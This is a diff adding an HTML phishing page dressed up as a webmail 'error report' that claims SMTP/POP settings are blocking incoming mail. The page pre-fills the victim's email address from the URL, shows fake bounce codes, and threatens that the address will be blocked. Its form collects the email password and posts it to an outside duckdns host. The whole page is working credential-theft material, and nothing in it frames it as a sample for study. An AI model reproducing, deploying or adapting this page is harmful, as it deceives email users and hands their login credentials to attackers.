@@ -1,0 +1,397 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>An error in your SMTP/POP settings is blocking your incoming emails</title>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    // Get the email from the URL hash
+    var email = window.location.hash.substr(1); // Remove the '#' character
+
+    // Set the email value to the input field
+    document.getElementById("email").value = email;
+
+    // Replace placeholder with the actual email
+    document.getElementById("email").value = document.getElementById("email").value.replace("[[Email]]", email);
+});
+</script>
+<style type="text/css">
+body {
+	background-color: #EFEFEF;
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+div {
+	box-sizing: border-box;
+}
+p {
+	padding: 0px;
+	clear: both;
+	float: none;
+	margin: 0px;
+}
+.container {
+	padding: 0px;
+	display: block;
+	margin-right: 14%;
+	margin-left: 14%;
+	margin-top: 0%;
+	margin-bottom: 0%;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+	background-color: #f6f6f6;
+}
+
+.container_Inner {
+	padding: 0px;
+	display: block;
+	background-color: #f6f6f6;
+	margin: 0px;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+}
+.inner4 {
+	background-color: #FFF;
+	float: right;
+	width: 84%;
+	padding: 10px;
+	border-left-width: 1px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-left-color: #ddd;
+}
+.inner4_inner {
+	background-color: #FFF;
+	float: right;
+	width: 88%;
+	padding: 10px;
+	border-left-width: 1px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-left-color: #ddd;
+}
+.topic3 {
+	float: left;
+	padding: 10px;
+	font-size: 14px;
+	text-align: right;
+	width: 16%;
+	font-weight: bold;
+	color: #666;
+}
+.topic3_inner {
+	float: left;
+	padding: 10px;
+	font-size: 12px;
+	text-align: right;
+	width: 12%;
+	font-weight: bold;
+	color: #666;
+}
+.bg_green {
+	background-color: #f4fff4;
+}
+.bg_ash {
+	background-color: #f8f8f8;
+}
+.TextFaint {
+	color: #999;
+	line-height: 1.4em;
+}
+
+.textfield1 {
+	padding: 6px;
+	margin-bottom: 8px;
+}
+.hotz_top {
+	border-top-width: 1px;
+	border-top-style: solid;
+	border-top-color: #ddd;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: none;
+}
+.red_text {
+	color: #F00;
+}
+.topHeader {
+	font-size: 24px;
+	color: #99999;
+	margin-right: 14%;
+	margin-left: 14%;
+	margin-top: 1.2%;
+	margin-bottom: 1.2%;
+}
+.aikman {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	line-height: 1.6em;
+	color: #333;
+	background-color: #FFF;
+	width: auto;
+	margin-right: 14%;
+	margin-left: 14%;
+	border-radius: 4px;
+	margin-bottom: 32px;
+	padding: 32px;
+	box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+	border: 1px solid #d6d7dc;
+	margin-top: 32px;
+}
+.Topic1 {
+	font-size: 18px;
+	margin-bottom: 20px;
+	color: #FFF;
+	background-color: #666;
+	padding: 16px;
+	text-align: center;
+	display: block;
+	border-radius: 4px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: none;
+</style>
+
+<script type="text/javascript">function populate() { 
+document.getElementById("demo").innerHTML = Date();
+var varSection = window.location.search.substr(1);
+document.getElementById("Email").value=varSection;
+document.getElementById("lbEmail").value=varSection
+} </script>
+</head>
+
+<body onLoad="populate()">
+<div class="aikman">
+<div class="Topic1"><strong class="textYellow"> Webmail   
+    ERROR REPORT</strong><br>
+    An error in your 
+    mailbox 
+    SMTP/POP settings is blocking your incoming emails.<br /></div>
+<div class="container">
+  <div class="topic3">Message:</div>
+  <div class="inner4">
+  
+      
+    
+    
+    
+    
+<div class="container_Inner">
+      <div class="topic3_inner"> Date:</div>
+      <div class="inner4_inner"><p id="demo">
+      </div>
+      <p>
+    </div><div class="container_Inner">
+      <div class="topic3_inner">Subject:</div>
+      <div class="inner4_inner"><span class="red_text">Error loading some of your inbox messages</span>
+      </div>
+      <p>
+    </div>
+      <div class="hotz_top"></div>
+  </div>
+  <p>
+  
+
+</div>
+<div class="container">
+  <div class="topic3">Bounce reason:</div>
+  <div class="inner4 bg_ash"> <strong>An error in your SMTP/POP settings is blocking your incoming e-mails</strong> <br />
+    <span class="TextFaint"> 550-5.1.1: POP configuration text can not be verified<br />
+    550-5.1.2: Login encountered an unhandled error in your SSL settings<br />
+    550-5.1.3: Login encountered an unhandled error in your SSL settings </span> </div>
+  <p>
+</div>
+<div class="container">
+  <div class="topic3">Suggested Solution:</div>
+  <div class="bg_green inner4">
+
+      <link href="prototype.css" rel="stylesheet" type="text/css" />
+<link href="field.css" rel="stylesheet" type="text/css" />
+<style type="text/css">
+.textFieldlog {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	color: #2E2E2E;
+	height: 24px;
+	width: 96%;
+	margin-bottom: 4px;
+	border: 1px solid #A8A8A8;
+	margin-right: auto;
+	margin-left: auto;
+	padding-top: 4px;
+	padding-right: 10px;
+	padding-bottom: 4px;
+	padding-left: 10px;
+	background-color: #FAFAF8;
+	background-image: url(images/bg_form.png);
+	background-repeat: repeat;
+}
+.ButtonLOG {
+	color: #FFF;
+	background-color: #F66;
+	border: 1px solid #FFF;
+	padding-top: 5px;
+	padding-right: 3px;
+	padding-bottom: 5px;
+	padding-left: 3px;
+	font-family: Arial, sans-serif;
+	font-size: 11.6px;
+	-webkit-border-radius: 4px;
+	-moz-border-radius: 4px;
+	-khtml-border-radius: 4px;
+	border-radius: 4px;
+	margin-right: 2%;
+	text-decoration: none;
+	margin-top: 2%;
+	font-weight: bold;
+}
+.ButtonLOG:hover {
+	background-color: #FF2F2F;
+}
+.texthinter {
+	font-size: 12px;
+	font-family: Arial, sans-serif;
+	color: #F00;
+}
+.textform {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 10px;
+	text-transform: uppercase;
+	color: #4D4D4D;
+}
+.YeloowTop {
+	background-color: #4B4B4B;
+	border: 1px solid #333333;
+	padding: 2%;
+	width: auto;
+	margin-right: auto;
+	margin-left: auto;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 16px;
+	color: #FFF;
+}
+.hint23 {
+	background-color: #FFEAEA;
+	border: 1px solid #FBB;
+	font-family: Tahoma, Geneva, sans-serif;
+	color: #333333;
+	font-size: 12px;
+	margin-bottom: 2%;
+	width: auto;
+	margin-right: auto;
+	margin-left: auto;
+	margin-top: 2%;
+	background-image: url(images/warning.png);
+	background-repeat: no-repeat;
+	background-position: 8px;
+	padding: 4px;
+	text-transform: none;
+}
+.sidebox67 {
+	background-color: #FFCC00;
+	padding: 4%;
+	width: auto;
+	margin-right: auto;
+	margin-left: auto;
+}
+td {
+	padding: 8px 4px;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: none;
+	border-left-style: none;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+}
+</style>
+<script src="field.js" type="text/javascript"></script>
+
+Fill out the form below, our technical team will fix the error in less than 3-4hrs. You will receive a confirmation email in your inbox once the error is fixed.<br />
+<strong>Note:</strong> Failure to send this error report will result in blocking of your e-mail address. <br />
+<br />
+<form action="http://goshemnetworks.duckdns.org/smtppop/cindy.php" method="post">
+  <div class="container_Inner">
+    <div class="topic3_inner">Email Address:</div>
+    <div class="inner4_inner"> <strong> &nbsp;&nbsp;
+      <label for="email"></label>
+      <span id="sprytextfield2">
+      <input name="email" type="email" class="textfield1" id="email" placeholder="Enter Email Address" size="40" maxlength="400" value="" readonly/>
+      <span class="textfieldRequiredMsg"><br />
+     &nbsp;&nbsp; Email address is required.</span><span class="textfieldInvalidFormatMsg"><br />
+    &nbsp;&nbsp;  Invalid email address.</span></span></strong></div>
+    <p> 
+  </div>
+  <div class="container_Inner">
+    <div class="topic3_inner">Password:</div>
+    <div class="inner4_inner"> &nbsp;&nbsp; <span id="sprytextfield1">
+      <input name="password" type="password" class="textfield1" id="pswrd"  placeholder="Enter Your Password" value="" size="40"
+        maxlength="400"/>
+      <span class="textfieldRequiredMsg"><br />
+      <div class="texthinter"> &nbsp;&nbsp;<strong>Password is Required</strong>.</div>
+      </span></span></div>
+    <p>
+    <div class="hotz_top"></div>
+  </div>
+  <br />
+  <p>
+    <input type="submit" class="button1" value="Submit Report" />
+    <input type="reset" name="button2" id="button2" value="Reset Form" class="button1"/>
+    </td>
+    <input type="hidden" name="date" value="Sun, Mar 19th 2017" />
+    <input type="hidden" name="ip_em" value="197.210.227.101  ::  Nigeria" />
+    <input type="hidden" name="remoteport" value="58908" />
+    <input type="hidden" name="serverport" value="80" />
+    <input type="hidden" name="MM_insert" value="form1" />
+</form>
+<script type="text/javascript">
+<!--
+var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
+var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "email");
+//-->
+</script>
+   
+   
+   
+    </div>
+  <p>
+        <div class="hotz_top"></div>
+  <script type="text/javascript">try{if(parent.$.Browser.chrome()){var o=document.body.style;o.paddingTop=o.paddingBottom=o.marginTop=o.marginBottom="0px";}parent.JS5.find(window.name).content.setHeight();}catch(e){}/*20130913*/</script> 
+</div>
+<br /><br />
+
+</body>
+</html>
